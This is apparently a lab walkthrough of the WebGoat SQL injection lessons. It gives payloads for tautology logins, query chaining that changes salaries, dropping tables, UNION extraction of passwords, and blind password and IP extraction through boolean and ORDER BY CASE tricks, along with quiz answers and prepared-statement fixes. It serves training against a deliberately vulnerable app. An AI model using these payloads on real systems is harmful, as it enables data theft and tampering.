# SQL Injection (intro)
### What is SQL?
`SELECT department FROM employees WHERE first_name='Bob' AND last_name='Franco';`
### Data Manipulation Language (DML)
`UPDATE employees SET department='Sales' WHERE first_name='Tobi' AND last_name='Barnett'`

### Data Definition Language (DDL)
`ALTER TABLE employees ADD phone varchar(20);`

### Data Control Language (DCL)
`GRANT ALTER TABLE TO UnauthorizedUser;`

### Try It! String SQL injection
`' OR '1'='1`

### Try It! Numeric SQL injection
`SELECT * FROM user_data WHERE  Login_Count = 0 AND userid = 0 OR 1 = 1`

### Compromising confidentiality with String SQL injection
Employee Name: `John`
Authentification TAN: `' OR '1'='1`

So the internal query would be like this.
`SELECT * FROM employees WHERE last_name = 'John' AND auth_tan = '' OR '1' = '1';`

### Compromising Integrity with Query chaining
Employee Name: `John`
Authentification TAN: `';UPDATE employees SET salary=86000 WHERE last_name='Smith';--`

So the internal query would be like this.
`SELECT * FROM employees WHERE last_name = 'John' AND auth_tan = ''; UPDATE employees SET salary=86000 WHERE last_name='Smith';--';`

### Compromising Availability
`;DROP TABLE access_log;--`

# SQL Injection (advanced)
### Try It! Pulling data from other tables
###### Appending solution
In the `Name` field: `' OR 1=1;SELECT * FROM user_system_data;--`
###### Union solution
In the `Name` field: `'; SELECT userid, first_name, last_name FROM user_data UNION SELECT userid, user_name, password FROM user_system_data;--`
### SQL Injection final test
We have a normal login form in addition with a register one, the vulnerable field is the "user" in the register tab.

Using sql blind injection we can check that if we pass a TRUE statement like `tom' AND 1=1 --` we get this error `User {0] already exists please try to register with a different username` whereas if we use a FALSE statement like `tom' AND 1=2 --` we get the next message `User Tom' AND 1=2 -- created, please proceed to the loging page.`

This way we can start just by asking the sql (blind sql injection) about the length of the password, with `tom' AND length(password) = x --`.

Next, knowing that the length of the password is 23, we can iterate over those 23 characters and ask the database if it pertains to a specific character, as such `tom' AND substring(password,<position>,1) = '<character>' --`.

We can do this manually, with burp, or we can just automate it with a python script as I did.

![script](http://i.imgur.com/fbYdcFd.png) 

### Quiz solutions
1. What is the difference between a prepared statement and a statement?
`A statement has got values instead of a prepared statement`
2. Which one of the following characters is a placeholder for variables?
`?`
3. How can prepared statements be faster than statements?
`Prepared statements are compiled once by the database management system waiting for imput and are pre-compiled this way`
4. How can a prepared statement prevent SQL-Injection?
`Placeholders can prevent that the users input gets attached to the SQL query resulting in a separation of code and data`
5. What happens if a person with malicious intent writes into a register form :Robert); DROP TABLE Students;-- that has a prepared statement?
`The database registers 'Robert' ); DROP TABLE Students;--'`

# SQL Injection (mitigation)
### Try it! Writing safe code
```
Connection conn = DriverManager.getConnection(DBURL, DBUSER, DBPW);
PreparedStatement ps = conn.prepareStatement("SELECT status FROM users WHERE name = ? AND mail = ?");
ps.setString(1, "user");
ps.setString(2, "user");
```

### Try it! Writing safe code (2)
```
try {
	String query = "SELECT * FROM users WHERE name = ?";
	Connection con = DriverManager.getConnection(DBURL, DBUSER, DBPW);
	PreparedStatement stmt = con.prepareStatement(query);
	stmt.setString(1, "Pepe");
	ResultSet rs = stmt.executeQuery();
} catch (Exception e) {
	System.out.println("fail");
}
```

### Practice
For this one, we have to inject in an ORDER BY clause, first of all we sort whatever column we want clicking on it, and intercepting the request with burp we can see that we make a request like this `http://127.0.0.1:8080/WebGoat/SqlInjectionMitigations/servers?column=<the column name we're sorting {id, hostname, ip, mac, status, description}>`
Now, we can  check that if we send in the colum request parameter `(CASE WHEN 1 = 1 THEN id ELSE hostname END)` CASE is the SQL "if" so, if 1 = 1, which is true, will sorter by `id` if not, by `hostname`, playing with this, we can blindli guess the ip.

We assume that the table name is called `servers` and the hostname we looking for is `webgoat-prd`.

The payload is `CASE WHEN ((SELECT SUBSTRING(ip,x,1) FROM servers WHERE hostname='webgoat-prd') = y) THEN hostname ELSE id END)`

Where `x` and `y` are variables we iterate with, if we get the servers sorted by hostname, we know that's the correct digit for the ip in that given index.

I created a script for retrieving it automatically.


![](http://i.imgur.com/1bBtONB.png)
